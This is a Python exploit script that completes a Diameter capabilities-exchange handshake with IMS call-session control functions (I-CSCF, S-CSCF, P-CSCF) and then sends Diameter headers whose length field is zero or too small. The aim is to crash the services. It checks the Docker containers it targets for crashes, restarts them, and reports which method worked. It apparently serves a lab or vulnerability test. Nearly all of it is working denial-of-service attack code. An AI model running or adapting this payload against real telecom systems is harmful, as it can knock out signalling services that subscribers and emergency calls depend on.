#!/usr/bin/env python3
"""
Diameter CER Handshake + Crash Attack
======================================
Establishes a proper Diameter CER/CEA handshake first,
then sends the malicious payload on the established connection.

This tests whether the CDP receiver processes data differently
on established vs unknown connections.
"""

import socket
import struct
import subprocess
import time
import sys


def check_container(name):
    result = subprocess.run(
        ['docker', 'inspect', '-f', '{{.State.Running}}', name],
        capture_output=True, text=True
    )
    return result.stdout.strip() == 'true'


def build_diameter_header(length, cmd_code=257, app_id=0, flags=0x80,
                          hbh=0x12345678, ete=0x87654321):
    header = struct.pack('!B', 1)
    header += struct.pack('!I', length)[1:]
    header += struct.pack('!B', flags)
    header += struct.pack('!I', cmd_code)[1:]
    header += struct.pack('!I', app_id)
    header += struct.pack('!I', hbh)
    header += struct.pack('!I', ete)
    return header


def build_avp(code, flags, data=b'', vendor_id=None):
    """Build a properly padded Diameter AVP"""
    avp = struct.pack('!I', code)
    avp += struct.pack('!B', flags)
    length = 8 + len(data)
    if vendor_id is not None and (flags & 0x80):
        length += 4
    avp += struct.pack('!I', length)[1:]
    if vendor_id is not None and (flags & 0x80):
        avp += struct.pack('!I', vendor_id)
    avp += data
    pad = (4 - (len(avp) % 4)) % 4
    avp += b'\x00' * pad
    return avp


def build_cer(local_host='attacker.ims.mnc009.mcc460.3gppnetwork.org',
              local_realm='ims.mnc009.mcc460.3gppnetwork.org'):
    """Build a Diameter CER (Capabilities Exchange Request)"""
    avps = b''
    
    # Origin-Host (AVP 264)
    host = local_host.encode()
    avps += build_avp(264, 0x40, host)
    
    # Origin-Realm (AVP 296)
    realm = local_realm.encode()
    avps += build_avp(296, 0x40, realm)
    
    # Host-IP-Address (AVP 257)
    ip_data = b'\x00\x01' + socket.inet_aton('172.22.0.1')
    avps += build_avp(257, 0x40, ip_data)
    
    # Vendor-Id (AVP 266)
    avps += build_avp(266, 0x40, struct.pack('!I', 10415))
    
    # Product-Name (AVP 269)
    avps += build_avp(269, 0x00, b'DiameterAttacker')
    
    # Origin-State-Id (AVP 278)
    avps += build_avp(278, 0x40, struct.pack('!I', 1))
    
    # Auth-Application-Id (AVP 258) - 3GPP Cx
    avps += build_avp(258, 0x40, struct.pack('!I', 16777216))
    
    # Supported-Vendor-Id (AVP 265) - 3GPP
    avps += build_avp(265, 0x40, struct.pack('!I', 10415))
    
    msg_len = 20 + len(avps)
    cer = build_diameter_header(msg_len, cmd_code=257, app_id=0,
                                flags=0x80, hbh=0xAAAA0001, ete=0xBBBB0001)
    return cer + avps


def attack_target(name, ip, port):
    """Attack a single target with CER handshake + crash payload"""
    print(f"\n{'='*60}")
    print(f"Target: {name} ({ip}:{port})")
    print(f"{'='*60}")
    
    if not check_container(name):
        print(f"  [!] {name} not running, skipping")
        return False
    
    # Step 1: Establish connection and send CER
    print(f"  [1] Sending CER handshake...")
    cer = build_cer()
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        sock.sendall(cer)
        
        # Wait for CEA response
        try:
            resp = sock.recv(4096)
            if len(resp) >= 20:
                version = resp[0]
                resp_len = int.from_bytes(resp[1:4], 'big')
                resp_flags = resp[4]
                resp_cmd = int.from_bytes(resp[5:8], 'big')
                print(f"  [2] Got CEA: v={version} len={resp_len} flags=0x{resp_flags:02x} cmd={resp_cmd}")
                
                if resp_cmd == 257:
                    print(f"  [+] Diameter handshake successful!")
                else:
                    print(f"  [-] Unexpected response command: {resp_cmd}")
            else:
                print(f"  [-] Short response: {len(resp)} bytes")
        except socket.timeout:
            print(f"  [-] No CEA response (timeout)")
        
        # Step 2: Send crash payload on the same connection
        print(f"  [3] Sending crash payload (length=0) on established connection...")
        
        # Malicious Diameter header with length=0
        crash = build_diameter_header(0, cmd_code=280, app_id=16777216,
                                      flags=0x80, hbh=0xAAAA0002, ete=0xBBBB0002)
        sock.sendall(crash)
        
        # Keep connection open for processing
        time.sleep(3)
        
        # Check if target crashed
        running = check_container(name)
        if not running:
            print(f"  *** {name} CRASHED! ***")
            sock.close()
            return True
        
        # Try more undersized lengths
        for length in [1, 4, 8, 12, 19]:
            print(f"  [4] Trying length={length}...")
            crash = build_diameter_header(length, cmd_code=280, app_id=16777216,
                                          flags=0x80, hbh=0xAAAA0002+length, ete=0xBBBB0002)
            try:
                sock.sendall(crash)
                time.sleep(1)
            except:
                pass
            
            running = check_container(name)
            if not running:
                print(f"  *** {name} CRASHED with length={length}! ***")
                sock.close()
                return True
        
        sock.close()
        
    except ConnectionRefusedError:
        print(f"  [-] Connection refused on port {port}")
    except Exception as e:
        print(f"  [-] Error: {e}")
    
    # Final check
    running = check_container(name)
    print(f"  {name} status: {'UP' if running else 'DOWN'}")
    return not running


def attack_fresh_connection(name, ip, port):
    """Send crash payload on a fresh connection (no CER)"""
    print(f"\n  [F] Fresh connection attack (no CER)...")
    
    if not check_container(name):
        print(f"  [!] {name} not running")
        return False
    
    for length in [0, 1, 4, 8, 19]:
        try:
            header = build_diameter_header(length)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))
            sock.sendall(header)
            time.sleep(2)
            sock.close()
        except:
            pass
        
        running = check_container(name)
        if not running:
            print(f"  *** {name} CRASHED with fresh connection, length={length}! ***")
            return True
    
    return False


def main():
    targets = {
        'icscf': ('172.22.0.19', 3869),
        'scscf': ('172.22.0.20', 3870),
        'pcscf': ('172.22.0.21', 3871),
    }
    
    print("=" * 70)
    print("Diameter CER Handshake + Crash Attack")
    print("Tests crash payload on established Diameter connections")
    print("=" * 70)
    
    crashed = []
    
    for name, (ip, port) in targets.items():
        # Try CER handshake approach first
        if attack_target(name, ip, port):
            crashed.append((name, 'cer_handshake'))
            subprocess.run(['docker', 'restart', name], capture_output=True)
            time.sleep(10)
            continue
        
        # Try fresh connection approach
        if attack_fresh_connection(name, ip, port):
            crashed.append((name, 'fresh_connection'))
            subprocess.run(['docker', 'restart', name], capture_output=True)
            time.sleep(10)
    
    # Summary
    print("\n" + "=" * 70)
    print("SUMMARY")
    print("=" * 70)
    if crashed:
        print(f"Crashes: {len(crashed)}")
        for name, method in crashed:
            print(f"  - {name}: crashed via {method}")
    else:
        print("No crashes detected.")


if __name__ == '__main__':
    main()
